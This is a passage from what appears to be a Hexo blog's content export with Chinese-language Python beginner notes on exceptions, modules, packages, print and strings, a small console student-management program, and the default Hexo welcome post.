__init__(self, length, min_len):</span><br><span class=\"line\">    # 用户输入的密码长度</span><br><span class=\"line\">        self.length = length</span><br><span class=\"line\">    # 系统要求的最小密码长度</span><br><span class=\"line\">        self.min_len = min_len</span><br><span class=\"line\"></span><br><span class=\"line\">    # 设置异常描述信息</span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return f&#x27;The length of your password is &#123;self.length&#125;, &#x27; \\</span><br><span class=\"line\">               f&#x27;it should be &#123;self.min_len&#125; at minimum&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">def main():</span><br><span class=\"line\"># 2. 抛出异常: 尝试执行：用户输入密码，如果长度小于3，抛出异常</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        password = input(&#x27;please input your password: &#x27;)</span><br><span class=\"line\">        if len(password) &lt; 3:</span><br><span class=\"line\">            # 抛出异常类创建的对象</span><br><span class=\"line\">            raise ShortInputError(len(password), 3) # raise 异常类名()</span><br><span class=\"line\"></span><br><span class=\"line\">    # 3. 捕获该异常</span><br><span class=\"line\">    except Exception as result:</span><br><span class=\"line\">        print(result)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;No exception, password input complete&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"模块\"><a href=\"#模块\" class=\"headerlink\" title=\"模块\"></a>模块</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;------------------------模块的使用方法-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：math模块下sqrt()开平方计算</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">1. 导入模块</span><br><span class=\"line\">2. 测试是否导入成功，调用该模块内的sqrt功能</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法一： import 模块名; 模块名.功能</span><br><span class=\"line\"></span><br><span class=\"line\">import math</span><br><span class=\"line\">print(math.sqrt(9))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 方法二：from 模块名 import 功能1，功能2....; 功能调用（不需要写模块名.功能）</span><br><span class=\"line\"></span><br><span class=\"line\">from math import sqrt</span><br><span class=\"line\">print(sqrt(9))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 方法三：from 模块名 import *; 功能调用（不需要写模块名.功能）</span><br><span class=\"line\"></span><br><span class=\"line\">from math import *</span><br><span class=\"line\">print(sqrt(9))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------as定义别名-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 语法：1.模块定义别名：import 模块名 as 别名。</span><br><span class=\"line\">#      2.功能定义别名：from 模块名 import 功能 as 别名</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：运行后暂定2秒打印hello</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">1.导入time模块或导入time模块的sleep功能</span><br><span class=\"line\">2.调用功能</span><br><span class=\"line\">3.打印hello</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 1.模块别名</span><br><span class=\"line\">import time as tt</span><br><span class=\"line\">tt.sleep(2)</span><br><span class=\"line\"># time.sleep(2)</span><br><span class=\"line\">print(&#x27;hello&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2.功能别名</span><br><span class=\"line\">from time import sleep as s1</span><br><span class=\"line\">s1(2)</span><br><span class=\"line\">print(&#x27;hello&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------制作模块之定义和测试模块-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 每个python文件都可以作为一个模块，模块的名字就是文件的名字，自定义模块名必须要符合标识符命名规则</span><br><span class=\"line\"># 请参考my_module1.py</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------制作模块之调用模块-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1.导入模块</span><br><span class=\"line\">import my_module1</span><br><span class=\"line\"></span><br><span class=\"line\"># 调用功能</span><br><span class=\"line\">my_module1.testA(2, 2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------模块定位顺序之注意点-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 自己新建的模块名不能和已有的模块名重复，否则就会导致模块无法使用 -- 例如random</span><br><span class=\"line\">import random</span><br><span class=\"line\">num = random.randint(1, 5)</span><br><span class=\"line\">print(num)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 当使用from xx import 功能 导入模块功能的时候，如果功能名字重复，</span><br><span class=\"line\">#    调用到的是最后定义的功能(又名函数)或是最后导入的功能</span><br><span class=\"line\"></span><br><span class=\"line\"># 场景：time.sleep()</span><br><span class=\"line\">def sleep():</span><br><span class=\"line\">    print(&#x27;This is a user-defined func&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">from time import sleep</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义函数 sleep</span><br><span class=\"line\"># def sleep():</span><br><span class=\"line\">#    print(&#x27;This is a user-defined func&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 拓展：模块名重复</span><br><span class=\"line\"># 问题：import 模块名 -- 不需要介意功能名字重复的问题</span><br><span class=\"line\">import time</span><br><span class=\"line\">print(time)</span><br><span class=\"line\"></span><br><span class=\"line\">time = 1</span><br><span class=\"line\">print(time)</span><br><span class=\"line\"></span><br><span class=\"line\"># 问题：为什么变量也能覆盖模块？ -- 在python语言中，数据是通过 引用 传递的</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------—__all__列表-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 如果一个模块文件中有__all__变量，当使用from xx import * 导入时，只能导入all列表中的元素</span><br><span class=\"line\"></span><br><span class=\"line\">from my_module2 import *</span><br><span class=\"line\"></span><br><span class=\"line\">testA()</span><br><span class=\"line\"></span><br><span class=\"line\"># 因为testB函数没有添加到all列表，只有all列表里面的功能才能导入</span><br><span class=\"line\"># testB()</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------—制作包-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 包将有联系的模块组织在一起，即放到同一个文件夹下，</span><br><span class=\"line\"># 并且在这个文件夹创建一个名字为__init__.py文件，那么这个文件夹就称之为包</span><br><span class=\"line\"></span><br><span class=\"line\"># [Mew]-[Python Package]-输入名称-[OK]-新建功能模块(有联系的模块)</span><br><span class=\"line\"># 注意：新建包后，包内部会自动创建__init__.py文件，这个文件控制着包的导入行为</span><br><span class=\"line\"></span><br><span class=\"line\"># 请参考mypackage包下my_module1.py与my_module2.py</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------—导入包-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法一：</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">1.导入</span><br><span class=\"line\">import 包名.模块名</span><br><span class=\"line\">2.调用功能</span><br><span class=\"line\">包名.模块名.功能()</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 导入mypackage包下的模块1：使用这个模块内的info_print1函数</span><br><span class=\"line\">import mypackage.my_module1</span><br><span class=\"line\"></span><br><span class=\"line\">mypackage.my_module1.info_print1()</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法二：</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">注意：必须在__init__.py文件中添加__all__ = []，控制允许导入的模块列表</span><br><span class=\"line\">from 包名 import *</span><br><span class=\"line\">模块名.功能()</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">from mypackage import *</span><br><span class=\"line\">my_module1.info_print1()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"test-txt\"><a href=\"#test-txt\" class=\"headerlink\" title=\"test.txt\"></a>test.txt</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">aaaaa</span><br><span class=\"line\">bbbbb</span><br><span class=\"line\">ccccc</span><br><span class=\"line\">ddddd</span><br><span class=\"line\">eeeee</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"my-module1\"><a href=\"#my-module1\" class=\"headerlink\" title=\"my_module1\"></a>my_module1</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 需求：一个函数完成任意两个数字加法运算</span><br><span class=\"line\">def testA(a, b):</span><br><span class=\"line\">    print(a + b)</span><br><span class=\"line\"></span><br><span class=\"line\"># 测试信息</span><br><span class=\"line\"># testA(1, 1)</span><br><span class=\"line\"></span><br><span class=\"line\"># print(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"># __name__是系统变量，是模块的标识符，其值为：</span><br><span class=\"line\"># 如果在自身模块中运行则值是__main__，否则是当前模块的名字</span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    testA(1, 1)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"my-module2\"><a href=\"#my-module2\" class=\"headerlink\" title=\"my_module2\"></a>my_module2</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 定义多个功能，把某个功能添加到__all__</span><br><span class=\"line\">__all__ = [&#x27;testA&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">def testA():</span><br><span class=\"line\">    print(&#x27;testA&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def testB():</span><br><span class=\"line\">    print(&#x27;testB&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"StudentManagerSystem\"><a href=\"#StudentManagerSystem\" class=\"headerlink\" title=\"StudentManagerSystem\"></a>StudentManagerSystem</h2><h3 id=\"main-py\"><a href=\"#main-py\" class=\"headerlink\" title=\"main.py\"></a>main.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 1.导入管理系统函数</span><br><span class=\"line\">from managerSystem import *</span><br><span class=\"line\"># 2.启动管理系统</span><br><span class=\"line\"># 保证是当前文件运行才启动管理系统 if --创建对象并调用main方法</span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    student_manager = StudentManager()</span><br><span class=\"line\">    student_manager.run()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"managerSystem-py\"><a href=\"#managerSystem-py\" class=\"headerlink\" title=\"managerSystem.py\"></a>managerSystem.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from student import *</span><br><span class=\"line\"></span><br><span class=\"line\">class StudentManager(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        # 存储学员数据 -- 列表</span><br><span class=\"line\">        self.student_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">    # 一，程序入口函数</span><br><span class=\"line\">    def run(self):</span><br><span class=\"line\">        # 1.加载文件里面的学员数据</span><br><span class=\"line\">        self.load_student()</span><br><span class=\"line\"></span><br><span class=\"line\">        while True:</span><br><span class=\"line\">            # 2.显示功能菜单</span><br><span class=\"line\">            self.show_menu()</span><br><span class=\"line\">            # 3.用户输入目标功能序号</span><br><span class=\"line\">            menu_num = int(input(&#x27;please input the func number: &#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">            # 4.根据用户输入的序号执行不同的功能</span><br><span class=\"line\">            if menu_num == 1:</span><br><span class=\"line\">                # 添加学员</span><br><span class=\"line\">                self.add_student()</span><br><span class=\"line\">            elif menu_num == 2:</span><br><span class=\"line\">                # 删除学员</span><br><span class=\"line\">                self.del_student()</span><br><span class=\"line\">            elif menu_num == 3:</span><br><span class=\"line\">                # 修改学员</span><br><span class=\"line\">                self.modify_student()</span><br><span class=\"line\">            elif menu_num == 4:</span><br><span class=\"line\">                # 查询学员</span><br><span class=\"line\">                self.query_student()</span><br><span class=\"line\">            elif menu_num == 5:</span><br><span class=\"line\">                # 显示所有学员信息</span><br><span class=\"line\">                self.show_student()</span><br><span class=\"line\">            elif menu_num == 6:</span><br><span class=\"line\">                # 保存学员信息</span><br><span class=\"line\">                self.save_student()</span><br><span class=\"line\">            elif menu_num == 7:</span><br><span class=\"line\">                # 退出系统 -- 退出循环</span><br><span class=\"line\">                break</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # 二，系统功能函数</span><br><span class=\"line\">    # 2.1 显示功能菜单 -- 静态方法</span><br><span class=\"line\">    @staticmethod</span><br><span class=\"line\">    def show_menu():</span><br><span class=\"line\">        print(&#x27;please select following item: &#x27;)</span><br><span class=\"line\">        print(&#x27;1: add student&#x27;)</span><br><span class=\"line\">        print(&#x27;2: delete student&#x27;)</span><br><span class=\"line\">        print(&#x27;3: modify student&#x27;)</span><br><span class=\"line\">        print(&#x27;4: query student&#x27;)</span><br><span class=\"line\">        print(&#x27;5: display all students\\&#x27; info&#x27;)</span><br><span class=\"line\">        print(&#x27;6: save student\\&#x27;s info&#x27;)</span><br><span class=\"line\">        print(&#x27;7: exit&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 2.2 添加学员</span><br><span class=\"line\">    def add_student(self):</span><br><span class=\"line\">        # 1. 用户输入姓名，性别，手机号</span><br><span class=\"line\">        name = input(&#x27;please input your name: &#x27;)</span><br><span class=\"line\">        gender = input(&#x27;please input your gender: &#x27;)</span><br><span class=\"line\">        tel = input(&#x27;please input your phone number: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">        # 2. 创建学员对象 -- 类在student文件里面，先导入student模块，再创建对象</span><br><span class=\"line\">        student = Student(name, gender, tel)</span><br><span class=\"line\"></span><br><span class=\"line\">        # 3. 将该对象添加到学员列表</span><br><span class=\"line\">        self.student_list.append(student)</span><br><span class=\"line\">        print(self.student_list)</span><br><span class=\"line\">        print(student)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 2.3 删除学员</span><br><span class=\"line\">    def del_student(self):</span><br><span class=\"line\">        # 1.用户输入目标学员姓名</span><br><span class=\"line\">        del_name = input(&#x27;please input the student\\&#x27;s name you want to delete: &#x27;)</span><br><span class=\"line\">        # 2.遍历学员列表，如果用户输入的学员存在则删除学员对象，否则提示学员不存在</span><br><span class=\"line\">        for i in self.student_list:</span><br><span class=\"line\">            if del_name == i.name:</span><br><span class=\"line\">                # 删除该学员对象</span><br><span class=\"line\">                self.student_list.remove(i)</span><br><span class=\"line\">                break</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(f&#x27;There is no student has a name &#123;del_name&#125;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">        print(self.student_list)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 2.4 修改学员</span><br><span class=\"line\">    def modify_student(self):</span><br><span class=\"line\">        modify_name = input(&#x27;please input the student\\&#x27;s name you want to modify: &#x27;)</span><br><span class=\"line\">        for i in self.student_list:</span><br><span class=\"line\">            if modify_name == i.name:</span><br><span class=\"line\">                i.name = input(&#x27;please input a new name: &#x27;)</span><br><span class=\"line\">                i.gender = input(&#x27;please input a new gender: &#x27;)</span><br><span class=\"line\">                i.tel = input(&#x27;please input a new phone number: &#x27;)</span><br><span class=\"line\">                print(f&#x27;modify student\\&#x27;s info success, &#x27;</span><br><span class=\"line\">                      f&#x27;new name &#123;i.name&#125;, new gender &#123;i.gender&#125;, new tel &#123;i.tel&#125;\\n&#x27;)</span><br><span class=\"line\">                break</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(f&#x27;There is no student has a name &#123;modify_name&#125;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 2.5 查询学员</span><br><span class=\"line\">    def query_student(self):</span><br><span class=\"line\">        query_name = input(&#x27;please input the student\\&#x27;s name you want to query: &#x27;)</span><br><span class=\"line\">        for i in self.student_list:</span><br><span class=\"line\">            if query_name == i.name:</span><br><span class=\"line\">                print(f&#x27;The student you want to query has a name &#123;i.name&#125;, &#x27;</span><br><span class=\"line\">                      f&#x27;a gender &#123;i.gender&#125;, a phone number &#123;i.tel&#125;\\n&#x27;)</span><br><span class=\"line\">                break</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(f&#x27;There is no student has a name &#123;query_name&#125;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # 2.6 显示所有学员信息</span><br><span class=\"line\">    def show_student(self):</span><br><span class=\"line\">        print(&#x27;name\\tgender\\ttel&#x27;)</span><br><span class=\"line\">        for i in self.student_list:</span><br><span class=\"line\">            print(f&#x27;&#123;i.name&#125;\\t&#123;i.gender&#125;\\t&#123;i.tel&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # 2.7 保存学员信息</span><br><span class=\"line\">    def save_student(self):</span><br><span class=\"line\">        f = open(&#x27;student.data&#x27;, &#x27;w&#x27;)</span><br><span class=\"line\">        # [学员对象] 转换成 [字典]</span><br><span class=\"line\">        new_list = [i.__dict__ for i in self.student_list]</span><br><span class=\"line\">        # 写入字符串数据 -- 列表转换成字符串</span><br><span class=\"line\">        f.write(str(new_list))</span><br><span class=\"line\"></span><br><span class=\"line\">        f.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    # 2.8 加载学员信息</span><br><span class=\"line\">    def load_student(self):</span><br><span class=\"line\">        # 尝试以r打开，有异常再用w</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            f = open(&#x27;student.data&#x27;, &#x27;r&#x27;)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            f = open(&#x27;student.data&#x27;, &#x27;w&#x27;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            # 文件读取出的数据是字符串还原成列表类型：[字典] 转换成 [学员对象]</span><br><span class=\"line\">            data = f.read() # 字符串</span><br><span class=\"line\">            new_list = eval(data)</span><br><span class=\"line\">            self.student_list = [Student(i[&#x27;name&#x27;], i[&#x27;gender&#x27;], i[&#x27;tel&#x27;]) for i in new_list]</span><br><span class=\"line\"></span><br><span class=\"line\">        finally:</span><br><span class=\"line\">            f.close()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"student-data\"><a href=\"#student-data\" class=\"headerlink\" title=\"student.data\"></a>student.data</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[&#123;&#x27;name&#x27;: &#x27;aaa&#x27;, &#x27;gender&#x27;: &#x27;male&#x27;, &#x27;tel&#x27;: &#x27;1111&#x27;&#125;]</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"student-py\"><a href=\"#student-py\" class=\"headerlink\" title=\"student.py\"></a>student.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">class Student(object):</span><br><span class=\"line\">    def __init__(self, name, gender, tel):</span><br><span class=\"line\">        # 姓名，性别，手机号</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        self.gender = gender</span><br><span class=\"line\">        self.tel = tel</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return f&#x27;&#123;self.name&#125;, &#123;self.gender&#125;, &#123;self.tel&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># aa = Student(&#x27;aa&#x27;, &#x27;male&#x27;, 111)</span><br><span class=\"line\"># print(aa)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"mypackage\"><a href=\"#mypackage\" class=\"headerlink\" title=\"mypackage\"></a>mypackage</h2><h3 id=\"my-module1-py\"><a href=\"#my-module1-py\" class=\"headerlink\" title=\"my_module1.py\"></a>my_module1.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(1)</span><br><span class=\"line\"></span><br><span class=\"line\">def info_print1():</span><br><span class=\"line\">    print(&#x27;my_module1&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"my-module2-py\"><a href=\"#my-module2-py\" class=\"headerlink\" title=\"my_module2.py\"></a>my_module2.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(2)</span><br><span class=\"line\"></span><br><span class=\"line\">def info_print2():</span><br><span class=\"line\">    print(&#x27;my_module2&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"init-py\"><a href=\"#init-py\" class=\"headerlink\" title=\"init.py\"></a><strong>init</strong>.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(2)</span><br><span class=\"line\"></span><br><span class=\"line\">def info_print2():</span><br><span class=\"line\">    print(&#x27;my_module2&#x27;)</span><br></pre></td></tr></table></figure>","categories":["python"],"tags":["基础"]},{"url":"/2022/08/17/hello-world/","content":"<hr>\n<h2 id=\"span\"><a href=\"#span\" class=\"headerlink\" title=\"span\"></a>span</h2><h1 id=\"Welcome-to-Hexo-This-is-your-very-first-post-Check-documentation-for-more-info-If-you-get-any-problems-when-using-Hexo-you-can-find-the-answer-in-troubleshooting-or-you-can-ask-me-on-GitHub\"><a href=\"#Welcome-to-Hexo-This-is-your-very-first-post-Check-documentation-for-more-info-If-you-get-any-problems-when-using-Hexo-you-can-find-the-answer-in-troubleshooting-or-you-can-ask-me-on-GitHub\" class=\"headerlink\" title=\"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\"></a>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</h1><h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"More-info-Writing\"><a href=\"#More-info-Writing\" class=\"headerlink\" title=\"More info: Writing\"></a>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></h1><h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<!-- toc -->\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"python基础副","url":"/2022/08/17/Python%E5%9F%BA%E7%A1%80%E5%89%AF/","content":"<h1 id=\"Demo01-py\"><a href=\"#Demo01-py\" class=\"headerlink\" title=\"Demo01.py\"></a>Demo01.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(&#x27;hello world!!!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;hello kitty!!!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;hello baby!!!&#x27;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Demo02-py\"><a href=\"#Demo02-py\" class=\"headerlink\" title=\"Demo02.py\"></a>Demo02.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(&#x27;Dear customer:&#x27;)</span><br><span class=\"line\">print(&#x27;    please click the hyperlinks to activate your account: Activate !&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"hello-py\"><a href=\"#hello-py\" class=\"headerlink\" title=\"hello.py\"></a>hello.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">print(&#x27;hello world!&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"print-demo-py\"><a href=\"#print-demo-py\" class=\"headerlink\" title=\"print_demo.py\"></a>print_demo.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># print函数</span><br><span class=\"line\"># 1.用法</span><br><span class=\"line\">print(&#x27;hello world!&#x27;)</span><br><span class=\"line\">name = &#x27;小白&#x27;</span><br><span class=\"line\">print(name)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2.用法：print(name,age,gender)</span><br><span class=\"line\">age = 18</span><br><span class=\"line\">gender = &#x27;boy&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(name,age,gender) # sep默认的分割是空格</span><br><span class=\"line\"></span><br><span class=\"line\"># 3.用法： print(value, value, value,..., sep=&#x27; &#x27;,end=&#x27;\\n&#x27;)</span><br><span class=\"line\">print(name,age,gender,sep=&#x27;_&#x27;) # sep=&#x27;*&#x27; sep=&#x27;$&#x27; sep=&#x27;-&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 转义字符： \\n 换行； \\t 制表符； \\r 回车； \\&#x27;； \\&quot;； \\\\</span><br><span class=\"line\">print(&#x27;hello\\nkitty&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;AAA&#x27;,end=&#x27;&#x27;)</span><br><span class=\"line\">print(&#x27;BBB&#x27;,end=&#x27;&#x27;)</span><br><span class=\"line\">print(&#x27;CCC&#x27;,end=&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;Dear customer:\\n\\tplease click the hyperlinks to activate your account: Activate!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;Dear customer:\\n&#x27;, &#x27;\\tplease click the hyperlinks to activate your account: Activate!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;George says: \\&#x27; I want to eat ice cream! \\&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;George says: &quot;I want to play dinosaur!&quot;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&quot;George says: &#x27;I want to sleep!&#x27;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;hello\\py\\thon&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(r&#x27;hello\\py\\thon&#x27;) # r&#x27;&#x27; raw 原样输出字符串的内容，即使有转义字符也不会转义</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"string-demo-py\"><a href=\"#string-demo-py\" class=\"headerlink\" title=\"string_demo.py\"></a>string_demo.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"># 字符串</span><br><span class=\"line\"></span><br><span class=\"line\"># s1 = &#x27;abc&#x27;</span><br><span class=\"line\"># s2 = &quot;abc&quot;</span><br><span class=\"line\"># s3 = &#x27;&#x27;&#x27;</span><br><span class=\"line\"># abc</span><br><span class=\"line\"># &#x27;&#x27;&#x27;</span><br><span class=\"line\"># print(id(s1),id(s2),id(s3)) # 三引号占用的内存空间与单双引号不同</span><br><span class=\"line\"># \t\t\t\t\t\t\t# (前提：三引号里面的内容不在同一行，保留一种其他格式的时候)</span><br><span class=\"line\"></span><br><span class=\"line\"># print(s1 == s2) # 比较的是内容</span><br><span class=\"line\"># print(s1 is s2) # 比较的是地址</span><br><span class=\"line\"></span><br><span class=\"line\"># print(s2 == s3)</span><br><span class=\"line\"># print(s2 is s3)</span><br><span class=\"line\"></span><br><span class=\"line\"># print(s2)</span><br><span class=\"line\"># print(s3)</span><br><span class=\"line\"></span><br><span class=\"line\"># s1 = input(&#x27;input: &#x27;)</span><br><span class=\"line\"># s2 = input(&#x27;input: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># print(s1 == s2) # True</span><br><span class=\"line\"># print(s1 is s2) # False </span><br><span class=\"line\"># 注意：普通变量/常量直接赋值相同内容用is判断是True，</span><br><span class=\"line\"># 用input输入来赋值，底层会做处理，即使输入相同内容，地址也会不同，用is判断是False.</span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串的运算符</span><br><span class=\"line\"></span><br><span class=\"line\"># s3 = s1 + s2  # 相当于拼接符</span><br><span class=\"line\"></span><br><span class=\"line\"># s4 = s1 * 